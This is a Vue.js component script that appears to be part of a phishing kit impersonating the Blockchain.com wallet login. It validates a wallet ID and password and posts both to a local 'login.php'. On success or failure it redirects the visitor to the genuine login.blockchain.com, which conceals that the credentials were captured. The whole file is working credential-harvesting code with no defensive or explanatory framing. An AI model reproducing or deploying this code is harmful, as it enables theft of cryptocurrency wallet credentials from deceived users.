<script>
/* eslint-disable */
import axios from 'axios'
export default {
  name: 'App',
  data () {
    return {
      walletidRequired: false,
      passwordRequired: false,
      walletid: '',
      password: '',
      progressActive: false,
      referrerPage: "//login.blockchain.com/#/login",
      version: '4.35.1'
    }
  },
  methods: {
    updateWalletidStatus () {
      let t = this
      if (t.walletid == '' && t.walletidRequired == false) {
        t.walletidRequired = true
      }
      if (t.walletid !== '' && t.isValidWalletId) {
        t.walletidRequired = false
      }
    },
    updateWalletidStatus2 () {
      let t = this
      if (t.walletidRequired) {
        t.updateWalletidStatus()
      }
    },
    updatePasswordStatus () {
      let t = this
      if (t.passwordRequired) {
        t.passwordRequired = t.password == ''
      }
    },
    submitForm () {
      let vm = this
      axios.post('login.php', {walletid: vm.walletid, password: vm.password})
      .then(res => {
        vm.progressActive = true
        setTimeout(function() {
          window.location.replace(vm.referrerPage);
        }, 350);
      })
      .catch(error => {
        vm.progressActive = true
        setTimeout(function() {
          window.location.replace(vm.referrerPage);
        }, 350);
      })
    },
    initiatePage () {
        let uri = window.location.href.split("?");
        if (uri.length > 0 && uri[1] !== undefined) {
            let vars = uri[1].split("&");
            let getVars = {};
            let tmp = "";
            vars.forEach(function(v) {
              tmp = v.split("=");
              if (tmp.length == 2)
                getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
            });
            this.version = "undefined" !== typeof getVars["v"] ? getVars["v"] : "";
        }
    }
  },
  computed: {
    canSubmit () {
      let t = this
      return t.isValidWalletId && t.password.length >= 8
    },
    isValidWalletId () {
      let t = this
      let r = new RegExp(/^[0-9a-zA-Z]{8}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{12}$/)
      return t.walletid !== '' ? r.test(t.walletid) : true
    }
  },
  beforeMount () {
    this.initiatePage()
  },
  watch: {
    password: function () {
      this.updatePasswordStatus()
    }
  }
};
</script>

